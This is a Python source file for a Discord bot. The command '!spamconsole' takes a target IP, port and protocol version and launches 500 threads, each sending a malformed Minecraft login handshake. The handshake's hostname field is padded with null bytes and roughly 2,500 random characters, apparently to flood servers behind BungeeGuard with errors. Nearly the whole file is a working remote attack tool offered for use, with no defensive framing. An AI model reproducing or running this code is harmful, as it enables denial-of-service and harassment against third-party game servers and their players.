import threading
import socket
import random
import discord
import string
import struct

from json import loads

bot = discord.Client(intents=discord.Intents.all())


@bot.event
async def on_ready():
    print(f'{bot.user} has connected to Discord!')


@bot.event
async def on_message(message):
    if not message.content.lower().startswith("!spamconsole"):
        return
    args = message.content.lower().split(" ")
    if len(args) < 2:
        await message.channel.send("Usage: !spamconsole <ip> <port> <protocol version>")
        return
    ip = args[1]
    port = int(args[2])
    protocol = int(args[3])

    await message.channel.send(ip + ":" + str(port))
    threading.Thread(target=create_threads, args=(ip, port, protocol)).start()


def create_threads(ip, port, protocol):
    for _ in range(500):
        threading.Thread(target=perform_handshake, args=(ip, port, protocol)).start()


def main():
    with open("bot_config.json", "r") as f:
        bot_config = loads(f.read())
        TOKEN = bot_config["TOKEN"]
    
    if TOKEN == "BOT_TOKEN":
        print("Please replace 'BOT_TOKEN' with your Discord bot token in the 'bot_config.json' file.")
        return

    bot.run(TOKEN)


def send_varint(sock, value):
    bytes_list = []
    while True:
        byte = value & 0x7F
        value >>= 7
        if value:
            byte |= 0x80
        bytes_list.append(byte)
        if not value:
            break
    sock.send(bytearray(bytes_list))


def append_varint(byte_array, value):
    while True:
        byte = value & 0x7F
        value >>= 7
        if value:
            byte |= 0x80
        byte_array.append(byte)
        if not value:
            break


def append_string(byte_array, value):
    append_varint(byte_array, len(value))
    byte_array.extend(value.encode('utf-8'))


def perform_handshake(DESTINATION_ADDRESS, DESTINATION_PORT, PROTOCOL_VERSION):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((DESTINATION_ADDRESS, DESTINATION_PORT)) # Connect to the server

        handshake_packet = bytearray() # Create a bytearray
        handshake_packet.append(0x00) # Append the handshake packet ID
        append_varint(handshake_packet, PROTOCOL_VERSION) # Append the protocol version for the server to verify the client version
        PAYLOAD = ""
        for _ in range(2498):
            PAYLOAD += random.choice(string.ascii_letters + string.ascii_lowercase + string.ascii_uppercase) # Create a malformed payload in the hostname section
        append_string(handshake_packet, f"\0\0{PAYLOAD}") # Append the malformed string
        handshake_packet.extend(struct.pack('>H', DESTINATION_PORT)) # Append the port of the server
        append_varint(handshake_packet, 2) # Set the next state to 2, being Login since bungeeguard only handles handshake for Login

        send_varint(sock, len(handshake_packet)) # Send the length of the handshake
        sock.send(handshake_packet) # Send the handshake packet

        sock.close() # Close the socket as we don't want to receive any disconnection packets


main()
